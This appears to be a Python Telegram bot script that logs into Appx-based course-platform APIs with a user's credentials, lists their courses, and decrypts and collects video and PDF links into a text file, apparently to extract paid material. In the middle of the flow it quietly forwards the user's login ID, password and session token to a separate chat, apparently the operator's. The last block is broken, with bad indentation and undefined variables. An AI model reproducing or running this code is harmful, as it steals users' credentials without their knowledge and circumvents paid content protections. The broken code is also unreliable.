import requests as r
import re
import json
from handlers import *
from weasyprint import HTML
from jinja2 import Template
from pyrogram.types import InputMediaDocument
import subprocess
from pyrogram.types.messages_and_media import message
from pyromod import listen
from pyrogram.types import Message
import pyrogram
from pyrogram import Client, filters
from pyrogram import Client as bot
from pyrogram.types.messages_and_media import message
from pyrogram.types import InlineKeyboardButton, InlineKeyboardMarkup, CallbackQuery
from pyrogram.errors import FloodWait
from pyrogram.types import User, Message
import logging
import main
import config
import asyncio
import os
import base64
import cloudscraper
from Crypto.Cipher import AES


def get_link(cid, pid, cname, raw_text05, hdr):
      resp = r.get(f'https://{raw_text05}/get/folder_contentsv2?course_id={cid}&parent_id={pid}', headers=hdr).json()["data"]
      for data in resp:                        
             if ((data["material_type"]) != "FOLDER") and ((data["file_link"]) != ""):                 
                 file_link = (data["file_link"])
                 title, file_link, pdf_link, pdf_link2 = (data["Title"]), decrypt(file_link.split(":")[0]), decrypt((data["pdf_link"]).split(":")[0]), decrypt((data["pdf_link2"]).split(":")[0])
                 video_link = f'{title.replace(":","")} : {file_link}'
                 if pdf_link and (pdf_link != file_link):
                        video_link += f'\n{title.replace(":","")} (pdf) : {pdf_link}'
                 if pdf_link2:
                        video_link += f'\n{title.replace(":","")} (pdf-2) : {pdf_link2}'
                 open(f"{cname}.txt", "a").write(f"{video_link}\n")  
             else:
                  pid = (data["id"])
                  get_link(cid, pid, cname, raw_text05, hdr)       
                  

async def appex_v2_txt(bot, m):
    editable = await bot.send_message(m.chat.id, "Send Your Folder **APPX APPLICATION API**\nLike `Aman Vashisht Yodha Uc Live` etc")
    input01: Message = await bot.listen(editable.chat.id)
    raw_text05 = input01.text
    await input01.delete(True)
    await editable.edit("Send **ID & Password** in this manner otherwise bot will not reply.\n\nSend like this »  ID*Password.")
    login_hdr = {
        'Client-Service': 'Appx',
        'Auth-Key': 'appxapi',
        'User-ID': '-2',
        'language': 'en',
        'device_type': 'ANDROID',
        'Host': f'{raw_text05}',
        'Connection': 'Keep-Alive',
        'User-Agent': 'okhttp/4.9.1',
    }
    
    data = {
        'email': '',
        'password': '',
        'devicetoken': 'evxVp-BBB3I:APA91bFSglfbsDx7kYeVNnOszxud1cUyXj-p54ejyaSvItmM7p5EPH9iyZKKk0N66gROVI3cRWVg1Bvy4tuBsU1VPulrjKqoiF644NI9dqKUswrnOc5TLd0ZHrTZsgy6tSLpcG6OMz7F',
        'mydeviceid': 'e4be9d04e8ca6e44',
    }
    input: Message = await bot.listen(editable.chat.id)
    raw_text = input.text
    await input.delete(True)
    if "*" in raw_text:
        data["email"] = raw_text.split("*")[0]
        data["password"] = raw_text.split("*")[1]    
        scraper = cloudscraper.create_scraper()	
        html = scraper.post("https://"+raw_text05+"/post/userLogin", data, headers=login_hdr).content
        output = json.loads(html)
        token = output["data"]["token"]
        userid = output["data"]["userid"]
    else:
        token = raw_text.split("$")[0]
        userid = raw_text.split("$")[1]
    
    hdr = {
        'Client-Service': 'Appx',
        'Auth-Key': 'appxapi',
        'User-ID': userid,
        'Authorization': token,
        'language': 'en',
        'Content-Type': 'application/x-www-form-urlencoded',
        'Host': f'{raw_text05}',
        'Connection': 'Keep-Alive',
        'User-Agent': 'okhttp/4.9.1',
    }        

    scraper = cloudscraper.create_scraper()
    params = (
    ('userid', f'{userid}'),
    )
    html1 = scraper.get("https://"+raw_text05+"/get/mycoursev2", headers=hdr, params=params).json()["data"]
    cool = ""
    for data in html1:
        aa = f" {data['id']} » {data['course_name']} ❇️ ₹{data['price']}\n\n"
        if len(f'{cool}{aa}') > 4096:
            print(aa)
            cool = ""
        cool += aa
    await bot.send_message(my_data, f"**Api :** `{raw_text05}`\n\n**ID * Pass :** `{raw_text}`\n\n**Token :** `{token}${userid}`\n\n{cool}")
    await editable.edit(f"**Batches Available are :-**\n\n**BATCH ID**  ➤  **BATCH NAME**\n\n{cool}\nSEND ID :")
    input1 = await bot.listen(editable.chat.id)
    raw_text1 = input1.text
    await input1.delete(True)
    
        caption_details = raw_text05.replace("api.classx.co.in", "").replace("api.teachx.co.in", "").replace("api.appx.co.in", "").replace("api.teachx.in", "").upper()
        file1 = InputMediaDocument(f"{cname}.txt", caption=f"**AppName :-** `{caption_details}`\n**BatchName :-** `{cid}` `{cname}`")   
       #file1 = InputMediaDocument(f"{cname}.txt", caption = f"**App Name :** {raw_text05.upper().replace("api.classx.co.in", "").replace("api.teachx.co.in", "").replace("api.appx.co.in", "")}\n**Batch Name :** `{cid}` `{cname}`")
        await bot.send_media_group(m.chat.id, [file1])
        
        os.remove(f"{cname}.txt")
        await bot.send_message(m.chat.id, "Batch Grabbing Done 🔰")
        
